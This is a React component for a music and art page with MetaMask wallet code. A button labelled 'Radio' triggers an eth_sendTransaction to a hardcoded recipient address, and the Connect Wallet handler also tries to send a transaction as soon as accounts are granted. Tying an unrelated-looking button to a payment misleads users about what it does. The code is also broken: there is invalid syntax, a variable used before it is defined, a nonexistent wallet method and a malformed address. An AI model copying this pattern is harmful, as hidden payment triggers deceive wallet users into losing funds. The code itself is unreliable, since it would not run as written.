/*import { ethers } from "ethers";*/
/*import detectEthereumProvider from '@metamask/detect-provider';*/
import { useEffect, useState} from'react';
import balance from './Omar_Balance.mp3';
import moon from './moon.png';
/*import otter from './otter.png';*/
import './App.css';
import React from 'react';
import ErrorMessage from "./ErrorMessage";
import TxList from "./TxList";

function App() {
  let audio = new Audio("/Omar_Balance.mp3")
  const start = () => {
    audio.play()
  }
  const [provider, setProvider] = useState("initialState");
  const [error, setError] = useState("");
  const [txs, setTxs] = useState(initialState);
  const [signer, setSigner] = useState(initialState);
  const initialState = { e.target.account.value };
  const [wallettAddress, setwallettAddress] = useState(initialState);
  const tx = {
    from: 'e.target.account.value',
    to: '0x058508d2ACFe10652072948A60B72860B7286bd1acEC9d',
    value: Number(50000000000000).toString(16),
    gasPrice: Number(2500000).toString(16),
    gas: Number(21000).toString(16),
  }
/*  const useEffect() => {
      const getProvider = async () => {
        const provider = await detectEthereumProvider({ silent :true })
      }*/
  
  async function sendTransaction(e) {
    let params = [{
      "from": e.target.account.value,
      "to": "0x058508d2ACFe10652072948A60B72860B7286bd1acEC9d",
      "value": Number(50000000000000).toString(16),
      "gasPrice": Number(2500000).toString(16),
      "gas": Number(21000).toString(16),  
    }]
    let result = await window.ethereum.request({method: "eth_sendTransaction", params});
  }
  const connectWallet = async(e) => {
    if (typeof window != "undefined" && typeof window.ethereum != "undefined"){
      try {
        /* MetaMask is not installed */
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts"});
        const sendTransaction = await window.ethereum.sendTransaction({method: "eth_sendTransaction, params"});
        setwalletAddress(accounts[0]);
        setSigner(accounts[0]);
        setProvider(accounts[0]);
        setTxs(tx);
        console.log("accounts[0]", await signer.getAddress());
      } catch(err) {
        console.error(err.message);
      }
    } else {
      /* MetaMask is not installed  */
      console.log("Please Install MetaMask");
    }
  } 
 /* const handleSubmit = async (e) => {
    e.preventDefault();
    const data = new FormData(e.target);
    setError();
    await startPayment({
      setError,
      setTxs,
    })
  }*/
    
  return (
    <div className="App">
      <header className="App-header">
        <button onClick={sendTransaction}>Radio</button>
        <p>
        <button onClick={connectWallet}>Connect Wallet</button>
        </p>
        <p>      
        <button onClick={start}>Play</button>
        </p>
        <img1 src="/crown.png" alt=""/>
        <p>
        <p>
        <img src="/Otter.png" alt=""/>
        </p>
         Block  <code> Chain</code> Content
        </p>
        <p>
         Art  <code> Officially</code> Intelligent
        </p>
        <a
          className="App-link"
          href="https://youtube.com/channel/UCiE4BAGwLvzzYzUHjQTHXxw"
          target="_blank"
          rel="nooener noreferrer"

        >
          Beating on the door
        </a>
      </header>
    </div>
  );
}
  
export default App;
